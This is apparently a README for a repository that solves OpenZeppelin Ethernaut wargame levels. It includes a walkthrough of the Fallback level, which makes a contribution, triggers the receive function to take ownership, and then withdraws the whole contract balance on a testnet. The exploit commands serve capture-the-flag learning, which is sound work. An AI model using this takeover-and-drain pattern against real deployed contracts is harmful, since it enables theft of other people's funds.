# Hackernaut 🧑‍🚀
Set of smart contracts for hacking the OpenZeppelin [Ethernaut game](https://ethernaut.openzeppelin.com/)
> **Note**: Not all the levels can be solved by creating a smart contract,
> this repository only contains the contracts that solve the levels 
> that **require** a Smart Contract to be solved.

### Getting Started

1. Create an [Alchemy](https://www.alchemy.com/) account.
2. Create a testing Rinkeby testnet account and feed it with some RinkebyETH using the [Alchemy Faucet](https://rinkebyfaucet.com/).
3. Create a `.env` file on the root folder containing the following variables

```shell
VICTIM_ADDRESS= # Address of the current contract you want to hack
ALCHEMY_API_KEY= # Your Alchemy API Key
RINKEBY_PRIVATE_KEY= # Private key from the Rinkeby testnet account
```

### Scripts
Before hacking each level you must setup the `VICTIM_ADDRESS` env variable previously mentioned. Then, you must run the yarn deploy script according to the level:

```shell
yarn deploy:<level_name>
```
After this, you must harcode the contract address in the respective script by overriding the `contractAddress` variable. Once done, run the following:

```shell
yarn start:<level_name>
```

Happy hacking! 😄

### Solutions

#### 1. Hello Ethernaut
Just follow the steps and you'll get there.

#### 2. Fallback
This level requires 2 steps to complete as described:

>You will beat this level if
>1. you claim ownership of the contract
>2. you reduce its balance to 0

##### Claiming the ownership
The trick here is to use the fallback `receive` function to get the ownership of the contract.

```sol
  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
```
In order to get there, we must statisfy 2 conditions: `msg.value` must be greater than zero and our account must have been contributed.

So before calling the fallback `receive` function, we need to make a contribution to the contract. We can do so as follows:

```js
  await contract.contribute({ value: 1 });
```
You can also check that the contribution was successful by calling the following line

```js
await contract.contributions(player).then(Number)
```
if the number is greater than zero, then you did it.

Now we can claim the ownership of the contract calling the fallback `receive` function. In order to call fallback payable functions, we just have to send a regular transaction to the contract address as follows:

```js
await contract.sendTransaction({ value: 1 })
```
Now if the transaction was successful, we must be the new owners of this contract lets check that.

```js
await contract.owner().then(owner => owner === player)
```
##### Reducing the balance to 0
The way to reduce the balance to 0 is by using the `withdraw` function, which sends all the current balance to the owner.

```sol
  function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
  }
```

We are the owners of the contract, let's take those coins!

```js
await contract.withdraw()
```
